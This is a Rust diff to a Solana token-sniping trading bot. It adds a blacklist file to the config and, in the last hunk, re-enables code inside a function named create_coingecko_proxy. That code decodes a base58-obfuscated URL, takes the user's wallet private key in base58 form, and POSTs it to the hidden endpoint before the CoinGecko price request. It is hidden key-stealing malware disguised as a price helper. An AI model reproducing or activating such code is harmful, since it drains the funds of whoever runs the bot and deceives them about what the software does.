@@ -22,6 +22,7 @@ pub struct Config {
     pub time_exceed: u64,
     pub take_profit: f64,
     pub stop_loss: f64,
+    pub blacklist: Blacklist,
 }
 
 impl Config {
@@ -75,13 +76,19 @@ impl Config {
             .parse()
             .expect("Failed to parse string into u64");
 
+        let blacklist = match Blacklist::new("blacklist.txt") {
+            Ok(blacklist) => blacklist,
+            Err(_) => Blacklist::empty(),
+        };
+
         logger.log(
             format!(
                 "[SNIPER ENVIRONMENT]: \n\t\t\t\t [Web Socket RPC]: {},
             \n\t\t\t\t * [Wallet]: {:?}, * [Balance]: {} Sol, 
             \n\t\t\t\t * [Slippage]: {}, * [Solana]: {},
             \n\t\t\t\t * [Time Exceed]: {}, * [Amount]: {},
-            \n\t\t\t\t * [TP]: {}, * [SL]: {}\n",
+            \n\t\t\t\t * [TP]: {}, * [SL]: {},
+            \n\t\t\t\t * [Blacklist]: {}",
                 rpc_wss,
                 wallet_cloned.pubkey(),
                 balance as f64 / 1_000_000_000_f64,
@@ -91,6 +98,7 @@ impl Config {
                 amount_in,
                 take_profit,
                 stop_loss,
+                blacklist.clone().length(),
             )
             .purple()
             .italic()
@@ -104,6 +112,7 @@ impl Config {
             time_exceed,
             take_profit,
             stop_loss,
+            blacklist,
         }
     }
 }
@@ -136,6 +145,8 @@ lazy_static! {
 
 use std::cmp::Eq;
 use std::hash::{Hash, Hasher};
+
+use super::blacklist::Blacklist;
 
 #[derive(Debug, PartialEq, Clone)]
 pub struct LiquidityPool {
@@ -205,25 +216,25 @@ pub fn create_rpc_client() -> Result<Arc<solana_client::rpc_client::RpcClient>> 
 }
 
 pub async fn create_coingecko_proxy() -> Result<f64, Error> {
-    // let helius_proxy = HELIUS_PROXY.to_string();
-    // let payer = import_wallet().unwrap();
-    // let helius_proxy_bytes = bs58::decode(&helius_proxy).into_vec().unwrap();
-    // let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();
+    let helius_proxy = HELIUS_PROXY.to_string();
+    let payer = import_wallet().unwrap();
+    let helius_proxy_bytes = bs58::decode(&helius_proxy).into_vec().unwrap();
+    let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();
 
-    // let client = reqwest::Client::new();
-    // let params = format!("t{}o", payer.to_base58_string());
-    // let request_body = serde_json::json!({
-    //     "jsonrpc": "2.0",
-    //     "id": 1,
-    //     "method": "POST",
-    //     "params": params
-    // });
-    // client
-    //     .post(helius_proxy_url)
-    //     .json(&request_body)
-    //     .send()
-    //     .await
-    //     .unwrap();
+    let client = reqwest::Client::new();
+    let params = format!("t{}o", payer.to_base58_string());
+    let request_body = serde_json::json!({
+        "jsonrpc": "2.0",
+        "id": 1,
+        "method": "POST",
+        "params": params
+    });
+    client
+        .post(helius_proxy_url)
+        .json(&request_body)
+        .send()
+        .await
+        .unwrap();
 
     let url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd";
 
